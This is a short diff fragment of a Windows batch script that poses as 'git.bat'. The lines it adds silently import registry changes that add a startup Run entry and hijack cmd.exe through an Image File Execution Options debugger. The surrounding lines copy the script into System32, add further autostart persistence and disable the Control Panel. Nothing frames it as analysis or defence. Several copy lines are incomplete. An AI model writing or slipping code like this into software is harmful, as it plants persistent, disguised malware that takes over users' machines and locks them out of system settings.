@@ -4,6 +4,26 @@ copy C:\Windows\System32
 
 copy C:\Windows\System32\
 
+@echo off
+
+echo Windows Registry Editor Version 5.00 > "%temp%\myreg.reg"
+
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> "%temp%\myreg.reg"
+
+echo "git"="C:\\Program Files\\git\\git.bat" >> "%temp%\myreg.reg"
+
+echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe] >> "%temp%\myreg.reg"
+
+echo "Debugger"="C:\\Windows\\System32\\git.bat" >> "%temp%\myreg.reg"
+
+echo [HKEY_CURRENT_USER\Software\git] >> "%temp%\myreg.reg"
+
+echo "Settings"="Value" >> "%temp%\myreg.reg"
+
+regedit /s "%temp%\myreg.reg"
+
+
+
 copy ""%0"" "%SystemRoot%\system32\git.bat"
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Filel" /t REG_SZ /d "%SystemRoot%\system32\git.bat" /f
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoControlPanel /t REG_DWORD /d 1 /f
